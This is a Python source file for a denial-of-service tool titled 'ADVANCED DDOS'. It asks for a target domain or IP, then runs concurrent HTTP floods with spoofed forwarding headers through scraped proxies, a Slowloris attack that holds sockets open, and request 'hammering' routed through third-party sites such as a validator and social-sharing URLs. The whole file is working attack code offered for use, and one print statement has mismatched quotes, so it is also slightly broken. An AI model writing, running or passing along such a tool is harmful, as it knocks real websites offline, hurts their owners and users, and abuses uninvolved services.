from queue import Queue
import time, socket, threading, urllib.request, random
import requests
from art import *
import animation
from tabulate import tabulate
from colorama import Fore, Style
import logging
import signal
import sys
from faker import Faker
from concurrent.futures import ThreadPoolExecutor

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
status = True
fake = Faker()

class AdvancedDDOS:
    def __init__(self):
        self.uagent = self._load_user_agents()
        self.bots = self._load_bot_urls()
        self.proxies = []
        self.attack_count = 0
        self.running = True
        
    def _load_user_agents(self):
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
        ]
        return agents

    def _load_bot_urls(self):
        return [
            "http://validator.w3.org/check?uri=",
            "http://www.facebook.com/sharer/sharer.php?u=",
            "http://twitter.com/intent/tweet?url="
        ]

    def _get_proxy_list(self):
        try:
            response = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000")
            self.proxies = response.text.split('\r\n')
            logging.info(f"Loaded {len(self.proxies)} proxies")
        except:
            logging.warning("Failed to fetch proxy list")

    def slowloris_attack(self, host, port):
        sockets = []
        try:
            for _ in range(200):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((host, int(port)))
                s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                s.send(f"User-Agent: {random.choice(self.uagent)}\r\n".encode())
                s.send("Accept-encoding: gzip, deflate\r\n".encode())
                sockets.append(s)
            
            while self.running:
                for s in sockets:
                    try:
                        s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    except:
                        sockets.remove(s)
                time.sleep(15)
        except Exception as e:
            logging.error(f"Slowloris error: {e}")

    def http_flood(self, url):
        try:
            headers = {
                'User-Agent': random.choice(self.uagent),
                'X-Forwarded-For': fake.ipv4(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache'
            }
            proxy = {'http': random.choice(self.proxies)} if self.proxies else None
            requests.get(url, headers=headers, proxies=proxy, timeout=5)
            self.attack_count += 1
        except:
            pass

    def get_parameters(self):
        global host, port, thr
        r = requests.get('http://jsonip.com')
        PUB_ip = r.json()['ip']
        
        print(Fore.MAGENTA + Style.BRIGHT + tprint("ADVANCED DDOS", font="block"))
        print(Fore.GREEN + "Enhanced DDoS Attack Script - Python 3.9+")
        print(f"{Fore.WHITE}Your IP: {Fore.RED}{PUB_ip}{Style.RESET_ALL}")
        
        while True:
            host_input = input(f"{Fore.CYAN}Target (Domain/IP): {Style.RESET_ALL}")
            if not host_input:
                print(Fore.RED + "Target required!")
                continue
            try:
                host = socket.gethostbyname(host_input)
                break
            except:
                print(Fore.RED + "Invalid target!")

        port = input(f"{Fore.CYAN}Port (default 80): {Style.RESET_ALL}") or 80
        thr = input(f"{Fore.CYAN}Threads (default 200): {Style.RESET_ALL}") or 200
        
        try:
            port = int(port)
            thr = int(thr)
        except:
            print(Fore.RED + "Invalid port/threads!")
            sys.exit(1)

        self._display_target_info(host_input, host, port, thr)

    def _display_target_info(self, input_host, resolved_host, port, thr):
        table = [[
            f"Target: {input_host}\n"
            f"IP: {resolved_host}\n"
            f"Port: {port}\n"
            f"Threads: {thr}"
        ]]
        print(Fore.BLUE + tabulate(table, tablefmt='grid') + Style.RESET_ALL)

    def start_attack(self):
        self._get_proxy_list()
        
        # Signal handler for graceful shutdown
        def signal_handler(sig, frame):
            self.running = False
            print("\nShutting down...')
            sys.exit(0)
        
        signal.signal(signal.SIGINT, signal_handler)

        # Start different attack types
        with ThreadPoolExecutor(max_workers=int(thr)) as executor:
            # HTTP Flood
            for _ in range(int(thr/2)):
                executor.submit(lambda: self.http_flood(f"http://{host}"))
            
            # Slowloris
            for _ in range(int(thr/4)):
                executor.submit(self.slowloris_attack, host, port)
            
            # Bot hammering
            for _ in range(int(thr/4)):
                executor.submit(lambda: bot_hammering(random.choice(self.bots) + f"http://{host}"))

        # Status monitoring
        start_time = time.time()
        while self.running:
            elapsed = time.time() - start_time
            print(f"\r{Fore.YELLOW}Attacking - Requests: {self.attack_count} - Time: {elapsed:.1f}s{Style.RESET_ALL}", end="")
            time.sleep(1)

def bot_hammering(url):
    while True:
        try:
            req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(ddos.uagent)}))
            time.sleep(0.5)
        except:
            time.sleep(0.5)

if __name__ == "__main__":
    ddos = AdvancedDDOS()
    ddos.get_parameters()
    ddos.start_attack()
